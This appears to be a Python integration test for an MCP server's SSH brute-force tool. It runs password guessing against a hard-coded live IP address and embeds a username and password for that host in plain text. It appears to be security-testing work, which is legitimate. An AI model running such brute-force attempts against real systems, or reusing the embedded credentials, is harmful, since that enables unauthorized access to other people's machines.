#!/usr/bin/env python3
"""
Integration tests for SSH brute force MCP server.

Tests against a real target with known credentials.
"""

import asyncio
import json
import os
import sys
import unittest

# Add servers directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "servers"))

# Disable test mode to run real SSH connections
os.environ["MCP_TEST_MODE"] = "false"

from ssh_bruteforce import ssh_bruteforce_multi_user


class TestSSHBruteforceMultiUserIntegration(unittest.TestCase):
    """Integration tests for ssh_bruteforce_multi_user against real target."""

    TARGET = "98.128.172.210"
    VALID_USERNAME = "alex"
    VALID_PASSWORD = "QJ^$PNE$dgj2D$u%Z0U@"

    def test_multi_user_finds_valid_credentials(self):
        """Test that ssh_bruteforce_multi_user finds valid credentials."""
        result = asyncio.run(
            ssh_bruteforce_multi_user(
                target=self.TARGET,
                passwords=f"wrongpass1,wrongpass2,{self.VALID_PASSWORD}",
                usernames=f"wronguser,{self.VALID_USERNAME}",
                port=22,
                timeout=10,
                delay=0.5,
                stop_on_success=True,
            )
        )
        parsed = json.loads(result)

        # Verify target and port
        self.assertEqual(parsed["target"], self.TARGET)
        self.assertEqual(parsed["port"], 22)

        # Verify valid credentials were found
        self.assertEqual(parsed["status"], "credentials_found")
        self.assertTrue(len(parsed["valid_credentials"]) > 0)

        # Check that the correct username/password was found
        found_alex = False
        for cred in parsed["valid_credentials"]:
            if cred["username"] == self.VALID_USERNAME and cred["password"] == self.VALID_PASSWORD:
                found_alex = True
                break

        self.assertTrue(found_alex, "Expected to find alex with correct password")


if __name__ == "__main__":
    unittest.main()
